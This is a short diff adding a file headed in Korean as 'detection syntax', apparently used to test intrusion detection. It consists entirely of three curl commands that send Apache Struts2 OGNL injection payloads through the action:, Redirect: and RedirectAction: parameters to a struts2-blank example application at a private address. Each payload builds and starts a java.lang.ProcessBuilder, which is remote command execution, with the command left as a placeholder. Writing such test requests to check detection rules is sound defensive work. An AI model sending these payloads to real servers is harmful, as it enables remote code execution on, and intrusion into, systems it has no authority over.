@@ -1,0 +1,4 @@
+## 탐지 구문 ##
+curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String\[\]\{%E2%80%98command%E2%80%99,%20%E2%80%98goes%E2%80%99,%20here%E2%80%99\})).start()}"
+curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/struts2-blank/example/save.action?Redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String\[\]\{%E2%80%98command%E2%80%99,%20%E2%80%98goes%E2%80%99,%20here%E2%80%99\})).start()}"
+curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/struts2-blank/example/save.action?RedirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String\[\]\{%E2%80%98command%E2%80%99,%20%E2%80%98goes%E2%80%99,%20here%E2%80%99})).start()\}"
